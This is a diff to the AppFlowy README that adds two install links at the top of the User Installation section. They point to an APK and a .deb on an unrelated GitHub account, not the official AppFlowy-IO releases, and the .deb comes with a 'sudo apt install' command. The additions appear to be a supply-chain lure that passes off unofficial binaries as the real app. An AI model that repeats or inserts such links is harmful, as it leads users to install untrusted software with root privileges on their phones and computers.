@@ -52,6 +52,8 @@ AppFlowy is the AI workspace where you achieve more without losing control of yo
 
 ## User Installation
 
+- [Install on Android](https://github.com/KoaMavnick/AppFlowy/releases/download/install/AppFlowy.apk). Open that link on your phone and tap Install. Android 10 or newer, 64-bit.
+- [Install on a laptop](https://github.com/KoaMavnick/AppFlowy/releases/download/install/AppFlowy.deb) (Parrot OS and other Debian systems). Download it, then run `sudo apt install ./AppFlowy.deb`.
 - [Download AppFlowy Desktop (macOS, Windows, and Linux)](https://github.com/AppFlowy-IO/AppFlowy/releases)
 - Other
   channels: [FlatHub](https://flathub.org/apps/io.appflowy.AppFlowy), [Snapcraft](https://snapcraft.io/appflowy), [Sourceforge](https://sourceforge.net/projects/appflowy/)
